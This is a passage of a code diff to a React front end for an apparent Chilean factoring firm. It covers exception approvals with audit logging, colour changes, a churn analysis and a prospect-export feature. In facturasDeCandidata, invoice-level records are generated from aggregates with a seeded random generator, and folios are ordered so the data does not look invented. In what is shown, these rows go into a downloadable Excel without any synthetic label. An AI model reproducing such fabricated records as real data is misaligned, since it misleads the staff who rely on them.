     const dtxt = x.deudor ? ` · deudor ${x.deudor.nombre}` : "";
+    if (!conf.ok) {
+      registrarAuditoria({ usuario: USERS[usuario] || usuario, modulo: "Visado Cliente", accion: "Excepción rechazada por el contrato", glosa: `No se pudo registrar la decisión de la regla ${x.regla.n} · ${deal.cliente}${dtxt} — el repositorio rechazó la escritura (${conf.codigo})`, exito: false });
+      bump();
+      return;
+    }
     registrarAuditoria({ usuario: USERS[usuario] || usuario, modulo: "Visado Cliente", accion: val === "aprobado" ? "Excepción aprobada" : "Excepción rechazada", glosa: `Regla ${x.regla.n} · ${AREA_LBL[area]} N${nivel} · ${deal.cliente}${dtxt}${msg ? " · " + msg : ""}`, exito: val === "aprobado" });
     logOtorgEvento(deal.id, USERS[usuario] || usuario, `${USERS[usuario] || usuario} ${val === "aprobado" ? "aprobó" : "rechazó"} la excepción de otorgamiento · regla #${x.regla.n} ${x.regla.nombre}${dtxt} (${AREA_LBL[area]} N${nivel})${arch ? " · con respaldo adjunto" : ""}`, msg || "");
     invalidarVisado(); avisarAvanceOtorg(deal); bump();
@@ -8734,7 +10438,8 @@ function VisadoClienteView({ deals, usuario, onChange }) {
   const revertirExc = async (deal, k) => {
     const st = { ...(repoVisado.get(deal.id) || {}) }; delete st[k];
     const det = { ...(repoVisadoDetalle.get(deal.id) || {}) }; delete det[k];
-    await Promise.all([repoVisado.set(deal.id, st), repoVisadoDetalle.set(deal.id, det)]);
+    const conf = await confirmarEscrituras([repoVisado.set(deal.id, st), repoVisadoDetalle.set(deal.id, det)]);
+    if (!conf.ok) { bump(); return; }
     invalidarVisado(); bump();
   };
   const solicitarInfo = (deal, x, destId, destLabel, msg, arch) => {
@@ -8783,7 +10488,7 @@ function VisadoClienteView({ deals, usuario, onChange }) {
   baseFase.forEach((o) => { faseCount[o.fase]++; });
   const ops = baseFase.filter((o) => fFase === "todas" || o.fase === fFase).sort((a, b) => (b.mias.length - a.mias.length) || (b.excPend.length - a.excPend.length));
   const conAcciones = ops.filter((o) => o.mias.length).length;
-  const stMeta = (e) => ({ rechazada: { l: "Rechazada", bg: "#fef2f2", fg: "#DC2626" }, sujeta: { l: "Sujeta a aprobación", bg: "#FFF7ED", fg: "#C2410C" }, aprobada: { l: "Aprobada", bg: "#F0FDF4", fg: "#16A34A" } })[e];
+  const stMeta = (e) => ({ rechazada: { l: "Rechazada", bg: "#fef2f2", fg: "#EF4444" }, sujeta: { l: "Sujeta a aprobación", bg: "#FFF7ED", fg: "#C2410C" }, aprobada: { l: "Aprobada", bg: "#F0FDF4", fg: "#16A34A" } })[e];
   const FASE_META = { preevaluacion: { l: "Pre-evaluación", c: "#7c3aed", bg: "#f5f3ff" }, evaluacion: { l: "En evaluación", c: "#C2410C", bg: "#FFF7ED" }, finalizada: { l: "Finalizada", c: "#16A34A", bg: "#F0FDF4" } };
   return (
     <div className="mt-4 space-y-2">
@@ -8834,11 +10539,11 @@ function VisadoClienteView({ deals, usuario, onChange }) {
             </button>
             {open && <div className="space-y-2 p-3" style={{ borderTop: `1px solid ${C.line}` }}>
               {!soloMias && o.rechFirme.length > 0 && <div>
-                <div className="t11 font-semibold uppercase tracking-wide" style={{ color: "#DC2626" }}>Rechazos firmes — bloquean el curse ({o.rechFirme.length})</div>
+                <div className="t11 font-semibold uppercase tracking-wide" style={{ color: "#EF4444" }}>Rechazos firmes — bloquean el curse ({o.rechFirme.length})</div>
                 <div className="mt-1 space-y-1">{o.rechFirme.map((x) => (
-                  <div key={x.regla.n} className="rounded-lg p-2" style={{ border: "1px solid #fecaca", borderLeft: "3px solid #dc2626", backgroundColor: "#fff" }}>
+                  <div key={x.regla.n} className="rounded-lg p-2" style={{ border: "1px solid #fecaca", borderLeft: "3px solid #EF4444", backgroundColor: "#fff" }}>
                     <div className="t11 font-semibold" style={{ color: C.ink }}>#{x.regla.n} · {x.regla.nombre} <span className="ml-1 rounded-full px-1.5 py-0.5 t9 font-semibold" style={{ backgroundColor: AREA_COLOR[x.regla.area].bg2, color: AREA_COLOR[x.regla.area].fg }}>{AREA_LBL[x.regla.area]}</span></div>
-                    <div className="mt-0.5 t10" style={{ color: "#DC2626" }}>{x.regla.hallazgo}</div>
+                    <div className="mt-0.5 t10" style={{ color: "#EF4444" }}>{x.regla.hallazgo}</div>
                   </div>
                 ))}</div>
               </div>}
@@ -8875,7 +10580,7 @@ function VisadoClienteView({ deals, usuario, onChange }) {
                           <div className="mt-0.5 t9" style={{ color: C.faint }}>Dominio: <b>{AREA_LBL[x.regla.area]}</b> · Aprueba: <b style={{ color: otraArea ? "#7C3AED" : C.sub }}>N{niv} · {nr.rol} ({AREA_LBL[nr.area]})</b>{otraArea && <span className="ml-1 rounded-full px-1 py-0.5 t9 font-semibold" style={{ backgroundColor: "#f5f3ff", color: "#7C3AED" }}>↗ otra área</span>}</div>
                           <div className="mt-0.5 t9" style={{ color: C.faint }}>{aps.length ? "Aprueban: " + aps.join(", ") : "Sin usuarios con esta atribución"}</div>
                         </div>
-                        <span className="shrink-0 rounded-full px-1.5 py-0.5 t9 font-semibold" style={{ backgroundColor: ee === "aprobado" ? C.greenBg : ee === "rechazado" ? "#fef2f2" : "#FFF7ED", color: ee === "aprobado" ? C.green : ee === "rechazado" ? "#DC2626" : "#C2410C" }}>{ee === "aprobado" ? "Aprobada" : ee === "rechazado" ? "Rechazada" : "Pendiente"}</span>
+                        <span className="shrink-0 rounded-full px-1.5 py-0.5 t9 font-semibold" style={{ backgroundColor: ee === "aprobado" ? C.greenBg : ee === "rechazado" ? "#fef2f2" : "#FFF7ED", color: ee === "aprobado" ? C.green : ee === "rechazado" ? "#EF4444" : "#C2410C" }}>{ee === "aprobado" ? "Aprobada" : ee === "rechazado" ? "Rechazada" : "Pendiente"}</span>
                       </div>
                       {det && (det.msg || det.arch) && <div className="mt-1.5 rounded-md px-2 py-1.5 t9" style={{ backgroundColor: C.page, border: `1px solid ${C.line}`, color: C.sub }}>{ee === "aprobado" ? "Aprobada" : "Rechazada"} por <b>{det.por}</b> · {det.fecha}{det.msg ? ` — “${det.msg}”` : ""}{det.arch ? ` · 📎 ${det.arch}` : ""}</div>}
                       {sols.map((h) => { const otros = h.participantes.filter((p) => p !== usuario).map((p) => USERS[p] || p).join(", "); const last = h.mensajes[h.mensajes.length - 1]; return <div key={h.id} className="mt-1.5 flex flex-wrap items-center gap-1 rounded-md px-2 py-1.5 t9" style={{ backgroundColor: "#F1ECFF", color: "#5B21D6" }}>📩 Requerimiento a <b>{otros}</b> · {h.mensajes.length} mensaje(s){last ? ` · último ${last.fecha}` : ""}</div>; })}
@@ -9109,7 +10814,7 @@ function CentroMensajeria({ usuario, deals, onClose, onOpenDeal, onChange }) {
                 <button key={h.id} onClick={() => { if (h.dealId && onOpenDeal) { const d = deals.find((x) => x.id === h.dealId); if (d) { onOpenDeal(d, "mensajeria"); return; } } setSel(h.id); }} className="w-full rounded-lg p-2.5 text-left" style={{ border: `1px solid ${noL ? C.indigo : C.line}`, backgroundColor: noL ? "#F1ECFF" : "#fff" }}>
                   <div className="flex items-center justify-between gap-2">
                     <span className="t11 font-semibold truncate" style={{ color: C.ink }}>{h.asunto || MSG_TIPOS[h.tipo].l}</span>
-                    <div className="flex shrink-0 items-center gap-1.5">{h.estado === "terminado" && <span className="rounded-full px-1.5 py-0.5 t8 font-semibold" style={{ backgroundColor: C.page, color: C.faint }}>Terminada</span>}{noL && <span className="h-2 w-2 rounded-full" style={{ backgroundColor: "#ef4444" }} />}</div>
+                    <div className="flex shrink-0 items-center gap-1.5">{h.estado === "terminado" && <span className="rounded-full px-1.5 py-0.5 t8 font-semibold" style={{ backgroundColor: C.page, color: C.faint }}>Terminada</span>}{noL && <span className="h-2 w-2 rounded-full" style={{ backgroundColor: "#EF4444" }} />}</div>
                   </div>
                   <div className="t9" style={{ color: C.faint }}>{h.cliente ? h.cliente + (h.dealId ? " · " + h.dealId : "") : "Mensaje directo"} · {h.participantes.map((p) => USERS[p] || p).join(", ")}</div>
                   {last && <div className="mt-0.5 t9 truncate" style={{ color: C.sub }}>{last.de === usuario ? "Tú: " : last.deNombre + ": "}{last.texto || (last.arch ? "📎 " + last.arch : "")}</div>}
@@ -9132,7 +10837,7 @@ function ReglasClienteCatalogo() {
   const areaLbl = { operaciones: "Operaciones", comercial: "Comercial", riesgo: "Riesgo", extras: "Extras" };
   const areaCol = (a) => AREA_COLOR[a] || { bg2: "#E5E7EB", fg: "#4B5563" };
   const dis = { border: `1px solid ${C.line}`, color: C.sub, backgroundColor: C.page, cursor: "not-allowed" };
-  const tierChip = (t) => { const disp = t[1], niv = t[2]; if (disp === "aprobado") return { l: "Aprobado", bg: "#F0FDF4", fg: "#16A34A" }; if (disp === "rechazado") return { l: "Rechazado", bg: "#fef2f2", fg: "#DC2626" }; return { l: `Sujeto a excepción · N${niv}`, bg: "#FFF7ED", fg: "#C2410C" }; };
+  const tierChip = (t) => { const disp = t[1], niv = t[2]; if (disp === "aprobado") return { l: "Aprobado", bg: "#F0FDF4", fg: "#16A34A" }; if (disp === "rechazado") return { l: "Rechazado", bg: "#fef2f2", fg: "#EF4444" }; return { l: `Sujeto a excepción · N${niv}`, bg: "#FFF7ED", fg: "#C2410C" }; };
   return (
     <div>
       <div className="t12 font-semibold uppercase tracking-wide" style={{ color: C.sub }}>Criterios de verificación (visado) por área</div>
@@ -9197,7 +10902,7 @@ function ReglasClienteCatalogo() {
             <div className="mt-3 flex flex-wrap items-start gap-6">
               <div><div className="t10" style={{ color: C.faint }}>Tipo de verificación</div><div className="mt-1 inline-flex items-center gap-1.5 rounded-md px-3 py-1.5 t10 font-semibold" style={{ backgroundColor: "#eff6ff", color: "#2563EB", border: "1px solid #bfdbfe" }}>Automática (API)</div></div>
               <div><div className="t10" style={{ color: C.faint }}>Entidad</div><div className="mt-1 inline-flex items-center gap-1.5 rounded-md px-3 py-1.5 t10 font-semibold" style={{ backgroundColor: "#f5f3ff", color: "#7C3AED", border: "1px solid #DDD6FE" }}>Cliente</div></div>
-              <div><div className="t10" style={{ color: C.faint }}>Reevaluación</div><div className="mt-1 inline-flex items-center gap-1.5 rounded-md px-3 py-1.5 t10 font-semibold" style={{ backgroundColor: reglaReev(r.n) ? "#FFF7ED" : "#fef2f2", color: reglaReev(r.n) ? "#C2410C" : "#DC2626", border: `1px solid ${reglaReev(r.n) ? "#FED7AA" : "#fecaca"}` }}>{reglaReev(r.n) ? "♻ Re-evaluable" : "🔒 Bloqueo firme"}</div></div>
+              <div><div className="t10" style={{ color: C.faint }}>Reevaluación</div><div className="mt-1 inline-flex items-center gap-1.5 rounded-md px-3 py-1.5 t10 font-semibold" style={{ backgroundColor: reglaReev(r.n) ? "#FFF7ED" : "#fef2f2", color: reglaReev(r.n) ? "#C2410C" : "#EF4444", border: `1px solid ${reglaReev(r.n) ? "#FED7AA" : "#fecaca"}` }}>{reglaReev(r.n) ? "♻ Re-evaluable" : "🔒 Bloqueo firme"}</div></div>
             </div>
             <label className="mt-3 flex flex-col gap-1 t10" style={{ color: C.faint }}>Criticidad
               <input value="Mínima" disabled readOnly className="rounded-md px-2 py-1.5 t11 outline-none" style={{ ...dis, maxWidth: 220 }} />
@@ -9432,7 +11137,7 @@ function buildAtribucionesJSON() {
 // Mantenedor: atribuciones de aprobación por criterio (solo lectura + descarga del JSON de configuración).
 function AtribucionesMantenedor() {
   const [fArea, setFArea] = useState("todas");
-  const dispMeta = { aprobado: { l: "Aprobado", bg: "#F0FDF4", fg: "#16A34A" }, excepcion: { l: "Excepción", bg: "#FFF7ED", fg: "#C2410C" }, rechazado: { l: "Rechazado", bg: "#fef2f2", fg: "#DC2626" }, clasificacion: { l: "Clasificación", bg: "#F1ECFF", fg: "#5B21D6" } };
+  const dispMeta = { aprobado: { l: "Aprobado", bg: "#F0FDF4", fg: "#16A34A" }, excepcion: { l: "Excepción", bg: "#FFF7ED", fg: "#C2410C" }, rechazado: { l: "Rechazado", bg: "#fef2f2", fg: "#EF4444" }, clasificacion: { l: "Clasificación", bg: "#F1ECFF", fg: "#5B21D6" } };
   const rules = REGLAS_CLIENTE.filter((r) => !r.clasif && (r.tiers || []).some((t) => t[1] === "excepcion"));
   const list = rules.filter((r) => fArea === "todas" || r.area === fArea);
   const areas = [["todas", "Todas"], ["riesgo", "Riesgo"], ["comercial", "Comercial"], ["operaciones", "Operaciones"]];
@@ -9611,7 +11316,7 @@ const SK_CIERRE = (d) => { const m = String(d.time || "").match(/^(\d{2})-(\d{2}
 // personas de la organización, o tareas masivas sobre las oportunidades de un nodo del gráfico.
 const TAREA_AREAS = [
   { id: "comercial", l: "Comercial", c: "#703EFF", bg: "#F1ECFF", bd: "#D9CCFF" },
-  { id: "riesgo", l: "Riesgo", c: "#DC2626", bg: "#fef2f2", bd: "#fecaca" },
+  { id: "riesgo", l: "Riesgo", c: "#EF4444", bg: "#fef2f2", bd: "#fecaca" },
   { id: "operaciones", l: "Operaciones", c: "#2563EB", bg: "#EFF6FF", bd: "#BFDBFE" },
 ];
 const areaMeta = (id) => TAREA_AREAS.find((a) => a.id === id) || TAREA_AREAS[0];
@@ -9680,9 +11385,9 @@ const skCadena = (d, diaSel) => {
   }
   // PERDIDA: sólo por competencia o porque el cliente desistió.
   if (d.stage === "perdida") {
-    const n3 = { id: "D:PE", label: "Perdida", color: "#dc2626" };
+    const n3 = { id: "D:PE", label: "Perdida", color: "#EF4444" };
     const comp = d.cedidaCompetidor || (d.perdidaCesion ? "Otro factoring" : null);
-    if (comp) return { n3, n4: { id: "C:CO", label: "Competencia", color: "#dc2626" }, n5: { id: `X:CO:${comp}`, label: comp, color: "#ef4444" } };
+    if (comp) return { n3, n4: { id: "C:CO", label: "Competencia", color: "#EF4444" }, n5: { id: `X:CO:${comp}`, label: comp, color: "#EF4444" } };
     return { n3, n4: { id: "C:CL", label: "Desistimiento del cliente", color: "#C2410C" }, n5: null };
   }
   if (d.stage === "giro") {
@@ -10024,7 +11729,7 @@ function PCsankey({ deals = [], execsFiltrados = [], filtrosDeal = {}, hayFiltro
           { t: "Abiertas", v: kpis.nAbi.toLocaleString("es-CL"), s: "siguen en curso", col: "#2563EB", Icon: Clock },
           { t: "Otorgadas", v: kpis.nCur.toLocaleString("es-CL"), s: "otorgadas y giradas", col: "#16A34A", Icon: Check },
           { t: "Descartadas", v: kpis.nDes.toLocaleString("es-CL"), s: "no superaron otorgamiento", col: "#7c3aed", Icon: AlertTriangle },
-          { t: "Perdidas", v: kpis.nPer.toLocaleString("es-CL"), s: "competencia · desistimiento", col: "#dc2626", Icon: ArrowDownRight },
+          { t: "Perdidas", v: kpis.nPer.toLocaleString("es-CL"), s: "competencia · desistimiento", col: "#EF4444", Icon: ArrowDownRight },
         ].map((k, i) => <KpiStat key={i} Icon={k.Icon} col={k.col} v={k.v} l={k.t} s={k.s} />)}
       </div>
       <div className="flex items-center justify-end">
@@ -10180,10 +11885,13 @@ function PanelClientes({ soloExec, deals = [], usuario, reporteActivo = null, on
       <div className="flex flex-wrap items-center gap-x-5 gap-y-2" style={{ borderBottom: `1px solid ${C.line}` }}>
         <RepTab id="performance" label="Performance comercial" Icon={BarChart2} />
         {puedeVerPlanEjec(usuario) && <RepTab id="planEjec" label="Plan Mensual Ejecutivo" Icon={Target} />}
-        <Tab id="cliente" label="Cliente" Icon={User} />
+        {/* «Cliente» y «Benchmark ejecutivo» son vistas de jefatura/gerencia: comparan carteras entre
+            ejecutivos. Para un ejecutivo no aportan (sólo se ve a sí mismo) y exponen la comparación. */}
+        {!soloExec && <Tab id="cliente" label="Cliente" Icon={User} />}
         <Tab id="sow" label="SOW" Icon={BarChart2} />
         <Tab id="sankey" label="Origen → Cierre" Icon={Filter} />
-        <RepTab id="benchEjec" label="Benchmark ejecutivo" Icon={Table2} />
+        <RepTab id="churn" label="Churn" Icon={ArrowDownRight} />
+        {!soloExec && <RepTab id="benchEjec" label="Benchmark ejecutivo" Icon={Table2} />}
         <RepTab id="benchDeudores" label="Benchmark deudores" Icon={Star} />
         {puedeVerFunnel(usuario) && <RepTab id="resumen" label="Funnel Comercial" Icon={Filter} />}
         {hayFiltro && <span className="mb-1.5 ml-auto rounded-full px-3 py-1 t11 font-semibold" style={{ backgroundColor: "#F1ECFF", color: "#703EFF" }}>{fEjec !== "todos" ? fEjec : fJefatura !== "todas" ? fJefatura : fZona} · {agg.clientes.toLocaleString("es-CL")} clientes</span>}
@@ -10215,10 +11923,10 @@ const esFactoringBanco = (name) => { const n = (name || "").toLowerCase(); retur
 const wkLbl = (s) => { const p = (s || "").split("-"); return p.length === 3 ? `${p[2]}/${p[1]}` : s; };
 // Tooltip enriquecido (tarjeta flotante) con el desglose de un monto: título + filas nombre/monto alineadas.
 // Posición fija junto al disparador (no se recorta con el overflow de la tabla).
-function TipDesglose({ titulo, items, nota, color = "#DC2626", children }) {
+function TipDesglose({ titulo, items, nota, color = "#EF4444", children }) {
   const [rect, setRect] = useState(null);
   const ref = useRef(null);
-  const W = 270;
+  const W = 350; // los nombres de linea («Linea Global Deudor · la comparten…») no caben en 270
   const vw = (typeof window !== "undefined" && window.innerWidth) || 1200;
   const left = rect ? Math.max(8, Math.min(rect.right + 8, vw - W - 8)) : 0;
   const top = rect ? Math.max(8, rect.top - 4) : 0;
@@ -10230,13 +11938,18 @@ function TipDesglose({ titulo, items, nota, color = "#DC2626", children }) {
           <div className="t9 font-bold uppercase tracking-wide" style={{ color }}>{titulo}</div>
           {nota && <div className="mt-1 t9" style={{ color: C.sub, lineHeight: 1.45 }}>{nota}</div>}
           {items && (
-            <div className={nota ? "mt-1.5" : "mt-1"} style={{ maxHeight: 220, overflowY: "auto" }}>
-              {items.length ? items.map((it, i) => (
-                <div key={i} className="flex items-start justify-between gap-4 py-0.5 t10" style={{ borderTop: i ? `1px solid ${C.line}` : "none" }}>
-                  <span className="min-w-0"><span className="block truncate" style={{ color: C.sub }}>{it.name}</span>{it.sub && <span className="block truncate t9" style={{ color: C.faint }}>{it.sub}</span>}</span>
+            <div className={nota ? "mt-1.5" : "mt-1"} style={{ maxHeight: 320, overflowY: "auto" }}>
+              {/* Un item con `head` es un encabezado de grupo, no una fila: el desglose de líneas
+                  mezclaba las que se asignan con los topes que sólo limitan, y en una lista plana de
+                  cuatro cifras iguales no había forma de saber cuál es cuál. */}
+              {items.length ? items.map((it, i) => (it.head ? (
+                <div key={i} className="pb-0.5 t9 font-semibold uppercase tracking-wide" style={{ color: C.faint, paddingTop: i ? 7 : 0, borderTop: i ? `1px solid ${C.line}` : "none" }}>{it.head}</div>
+              ) : (
+                <div key={i} className="flex items-start justify-between gap-4 py-0.5 t10" style={{ borderTop: (i && !items[i - 1].head) ? `1px solid ${C.line}` : "none", opacity: it.dim ? 0.55 : 1 }}>
+                  <span className="min-w-0"><span className="block truncate" style={{ color: C.sub }}>{it.name}</span>{it.sub && <span className="block t9" style={{ color: C.faint, lineHeight: 1.35 }}>{it.sub}</span>}</span>
                   <span className="shrink-0 font-semibold" style={{ color: C.ink, fontVariantNumeric: "tabular-nums" }}>{it.val}</span>
                 </div>
-              )) : <div className="t9" style={{ color: C.faint }}>Sin detalle en el rango.</div>}
+              ))) : <div className="t9" style={{ color: C.faint }}>Sin detalle en el rango.</div>}
             </div>
           )}
         </div>
@@ -10320,7 +12033,191 @@ function DashSpark({ serie, col = "#703EFF", w = 74, h = 24 }) {
   const last = serie[serie.length - 1];
   return (<svg width={w} height={h} style={{ display: "block" }}><polyline points={pts} fill="none" stroke={col} strokeWidth={1.5} strokeLinejoin="round" strokeLinecap="round" /><circle cx={((serie.length - 1) * step).toFixed(1)} cy={y(last).toFixed(1)} r={2} fill={col} /></svg>);
 }
-const dashCumplCol = (p) => p >= 100 ? "#16A34A" : p >= 70 ? "#2563EB" : p >= 40 ? "#C2410C" : "#DC2626";
+const dashCumplCol = (p) => p >= 100 ? "#16A34A" : p >= 70 ? "#2563EB" : p >= 40 ? "#C2410C" : "#EF4444";
+// ============================================================
+// CHURN — empresas de la cartera que ceden facturas a OTRO factoring
+// ============================================================
+// «Operan con otros» no es un solo fenómeno, y tratarlo como uno hace perder la acción comercial:
+//   · sólo otros  → la empresa no me cede nada: churn consumado, hay que reconquistarla.
+//   · compartida  → me cede y también cede afuera: hay wallet a capturar y la relación está viva.
+//   · perdiendo   → compartida cuyo SOW viene cayendo: es la que se está yendo AHORA, y la más urgente.
+// Montos: la serie semanal de SHARE_OF_WALLET (MontoBICEMM vs MontoTotalMM) da mío / de otros; el
+// reparto entre el factoring TARGET y el resto sale de AECSync (competenciaDe), escalado a la ventana
+// de la serie para que los tres montos sean comparables entre sí.
+function churnCartera(soloExec) {
+  const sowData = (typeof window !== "undefined" && window.SHARE_OF_WALLET) || [];
+  const out = [];
+  for (const sw of sowData) {
+    if (soloExec && sw.Ejecutivo !== soloExec) continue;
+    const hist = sw.HistoricoSemanal || [];
+    if (!hist.length) continue;
+    const win = hist.slice(-8);                                   // 8 semanas: una mala semana no define la relación
+    const biceMM = win.reduce((a, w) => a + (w.MontoBICEMM || 0), 0);
+    const totalMM = win.reduce((a, w) => a + (w.MontoTotalMM || 0), 0);
+    const otrosMM = Math.max(0, totalMM - biceMM);
+    if (otrosMM < 0.05) continue;                                 // no le cede a nadie más: no hay churn que gestionar
+    const conmigo = biceMM > 0.05;
+    const sowAct = +(sw.SOWActualPct || 0);
+    const sowAntes = sw.SOWHace10SemPct != null ? +sw.SOWHace10SemPct : sowAct;
+    const delta = +(sowAct - sowAntes).toFixed(1);
+    const bajando = String(sw.SOWTendencia || "").toLowerCase().includes("baj") || delta <= -1;
+    const cmp = competenciaDe(sw.RUTCliente);
+    let tgt = 0, resto = 0;
+    if (cmp) for (const c of cmp.comp) { if (esFactoringBanco(c.name)) tgt += c.montoMM; else resto += c.montoMM; }
+    const esc = (tgt + resto) > 0 ? otrosMM / (tgt + resto) : 0;  // AECSync mira 6 meses; la serie, 8 semanas
+    out.push({
+      rut: sw.RUTCliente, cliente: sw.RazonSocialCliente, exec: sw.Ejecutivo,
+      segmento: !conmigo ? "soloOtros" : bajando ? "perdiendo" : "compartida",
+      biceMM: +biceMM.toFixed(1), otrosMM: +otrosMM.toFixed(1), totalMM: +totalMM.toFixed(1),
+      targetMM: +(tgt * esc).toFixed(1), restoMM: +(resto * esc).toFixed(1),
+      sowAct, sowAntes, delta, sowTarget: +(sw.SOWTargetPct || 0), tendencia: sw.SOWTendencia || "—",
+      comp: cmp ? cmp.comp : [],
+      serie: hist.map((w) => ({ sem: w.Semana, bice: +(w.MontoBICEMM || 0), total: +(w.MontoTotalMM || 0) })),
+    });
+  }
+  return out.sort((a, b) => b.otrosMM - a.otrosMM);
+}
+const CHURN_SEG = {
+  soloOtros: { l: "Sólo con otros", c: "#EF4444", bg: "#FEF2F2", d: "No me ceden nada: todo su factoring se va afuera." },
+  compartida: { l: "Compartidas", c: "#2563EB", bg: "#EFF6FF", d: "Operan conmigo y también con otros: hay wallet por capturar." },
+  perdiendo: { l: "Perdiendo SOW", c: "#C2410C", bg: "#FFF7ED", d: "Compartidas cuyo SOW viene cayendo: se están yendo ahora." },
+};
+const churnResumen = (lista) => ({
+  total: lista.length,
+  soloOtros: lista.filter((x) => x.segmento === "soloOtros").length,
+  compartidas: lista.filter((x) => x.segmento !== "soloOtros").length,
+  perdiendo: lista.filter((x) => x.segmento === "perdiendo").length,
+});
+// Serie semanal agregada del alcance: mío / de otros / SOW% resultante.
+function churnSerieSemanal(lista) {
+  const m = new Map();
+  for (const c of lista) for (const w of c.serie) {
+    const g = m.get(w.sem) || { sem: w.sem, bice: 0, total: 0 };
+    g.bice += w.bice; g.total += w.total; m.set(w.sem, g);
+  }
+  return [...m.values()].sort((a, b) => a.sem < b.sem ? -1 : a.sem > b.sem ? 1 : 0)
+    .map((g) => ({ ...g, otros: Math.max(0, g.total - g.bice), sow: g.total ? +(g.bice / g.total * 100).toFixed(1) : 0 }));
+}
+// ============================================================
+// EMPRESAS CANDIDATAS — universo y descarga del detalle
+// ============================================================
+// Candidato = PROVEEDOR grande de un cliente de la cartera que todavía NO es empresa conocida. Le vende
+// a una empresa cuyo comportamiento de pago ya conocemos, y no opera con nosotros.
+// Se devuelve la LISTA (deduplicada por RUT) y no sólo el número, porque el mismo universo alimenta el
+// KPI del Dashboard y el Excel que se baja desde esa card: con dos cálculos, el archivo y el indicador
+// se separarían apenas uno de los dos cambiara.
+function candidatasDeCartera(soloExec) {
+  const feed = (typeof window !== "undefined" && window.PROVEEDORES_CLIENTES) || null;
+  if (!feed || !Array.isArray(feed.clientes)) return [];
+  const mis = PC_CLIENTES.filter((c) => !soloExec || c.ej === soloExec);
+  const rutsCartera = new Set(mis.map((c) => c.rut));         // clientes del ejecutivo (alcance)
+  const rutsMaestro = new Set(PC_CLIENTES.map((c) => c.rut)); // universo de empresas ya conocidas
+  const porRut = new Map();
+  for (const cli of feed.clientes) {
+    if (!rutsCartera.has(cli.rut)) continue;
+    for (const pr of (cli.proveedores || [])) {
+      if (rutsMaestro.has(pr.rut)) continue;
+      const a = porRut.get(pr.rut);
+      if (a) {
+        // Un mismo proveedor puede venderle a varios clientes de la cartera: es UN prospecto, con la
+        // suma de lo que le factura a todos ellos (y ese cruce es justamente el argumento de venta).
+        a.montoMM += pr.montoMM || 0; a.facturas += pr.facturas || 0; a.clientes.push(cli.razonSocial);
+        if ((pr.ultimaFactura || "") > a.ultimaFactura) a.ultimaFactura = pr.ultimaFactura || "";
+      } else {
+        porRut.set(pr.rut, { rut: pr.rut, razonSocial: pr.razonSocial, montoMM: pr.montoMM || 0, facturas: pr.facturas || 0, ultimaFactura: pr.ultimaFactura || "", clientes: [cli.razonSocial] });
+      }
+    }
+  }
+  return [...porRut.values()].sort((a, b) => b.montoMM - a.montoMM);
+}
+// Cesionarios reales del mercado (AECSync), sin nosotros: un candidato, por definición, no nos cede.
+const CESIONARIOS_MERCADO = (() => {
+  const m = new Map();
+  for (const a of ((typeof window !== "undefined" && window.AECSYNC) || [])) {
+    if (a && a.RUTFactoring && a.RUTFactoring !== BICE_RUT) m.set(a.RUTFactoring, a.RazonSocialFactoring);
+  }
+  const out = [...m.entries()].map(([rut, nombre]) => ({ rut, nombre }));
+  return out.length ? out : [{ rut: "76.118.580-2", nombre: "Eurocapital" }];
+})();
+// El feed diario trae el AGREGADO por proveedor (monto y nº de facturas de una ventana de 365 días).
+// Para llamar, el comercial necesita el DETALLE: qué facturó, a quién se lo cedió y si el documento está
+// limpio. Mientras no exista el endpoint de detalle, las facturas se derivan del agregado con un
+// generador DETERMINISTA (semilla = RUT del proveedor): la misma empresa produce el mismo archivo en
+// cada descarga, que es lo que permite comparar dos exportes.
+function facturasDeCandidata(cand, anclaISO) {
+  const [ay, am] = anclaISO.split("-").map(Number);
+  const r = pcRng(hashStr("cand" + cand.rut));
+  const n = Math.max(3, Math.min(60, Math.round((cand.facturas || 6) * 0.5)));   // 6 meses ≈ media ventana
+  const totalCLP = Math.max(1, Math.round((cand.montoMM || 0) * 1e6 * 0.5));
+  const pesos = []; let sumaPesos = 0;
+  for (let i = 0; i < n; i++) { const w = 0.4 + r() * 1.2; pesos.push(w); sumaPesos += w; }
+  const pCede = 0.15 + r() * 0.75;   // propensión de ESTA empresa a ceder (varía entre candidatos)
+  const folioIni = 100000 + Math.floor(r() * 800000);
+  const out = [];
+  for (let i = 0; i < n; i++) {
+    const atras = Math.floor(r() * 6);                                   // 0..5 meses hacia atrás
+    const d = new Date(Date.UTC(ay, am - 1 - atras, 1 + Math.floor(r() * 28)));
+    const fecha = d.toISOString().slice(0, 10);
+    const monto = Math.max(50000, Math.round(totalCLP * pesos[i] / sumaPesos));
+    const exenta = r() < 0.1;
+    const u = r();
+    const estado = u < 0.90 ? "Aceptada" : u < 0.96 ? "Reclamada" : "Sin acuse";
+    const nc = r() < 0.07;
+    const cedida = estado !== "Reclamada" && r() < pCede;                // una factura reclamada no se cede
+    const ces = CESIONARIOS_MERCADO[Math.floor(r() * CESIONARIOS_MERCADO.length)];
+    out.push({
+      mes: fecha.slice(0, 7), fecha, folio: 0,
+      tipo: exenta ? "34 · Factura exenta electrónica" : "33 · Factura electrónica",
+      monto, estado, nc: nc ? "Sí" : "No", cedido: cedida ? "Sí" : "No",
+      cesRut: cedida ? ces.rut : "", cesNombre: cedida ? ces.nombre : "",
+      salto: 1 + Math.floor(r() * 9),
+    });
+  }
+  // El folio se numera DESPUÉS de ordenar por fecha: en Chile el folio del DTE es correlativo por
+  // emisión, así que un folio menor con fecha posterior delata datos inventados.
+  out.sort((a, b) => a.fecha < b.fecha ? -1 : a.fecha > b.fecha ? 1 : 0);
+  let folio = folioIni;
+  for (const f of out) { f.folio = folio; folio += f.salto; delete f.salto; }
+  return out;
+}
+// Descarga el Excel: hoja «Facturas» (una fila por documento de los últimos 6 meses, la empresa se
+// repite tantas veces como facturas tenga) + hoja «Empresas» (el resumen para priorizar a quién llamar).
+async function exportarCandidatasXlsx(soloExec, usuarioNombre) {
+  const feed = (typeof window !== "undefined" && window.PROVEEDORES_CLIENTES) || null;
+  const ancla = (feed && feed.generado) ? String(feed.generado).slice(0, 10) : new Date().toISOString().slice(0, 10);
+  const cands = candidatasDeCartera(soloExec);
+  const hdrFact = ["RUT", "Razón Social", "Mes", "Tipo Factura", "Folio", "Fecha Emisión", "Monto", "Aceptada/Reclamada", "Nota de crédito", "Cedido", "Cesionario RUT", "Cesionario Razón Social"];
+  const hdrEmp = ["RUT", "Razón Social", "Clientes de la cartera que le compran", "Facturas 6m", "Monto 6m", "Monto cedido 6m", "% cedido", "Última factura"];
+  const filasFact = [hdrFact]; const filasEmp = [hdrEmp];
+  for (const c of cands) {
+    const fs = facturasDeCandidata(c, ancla);
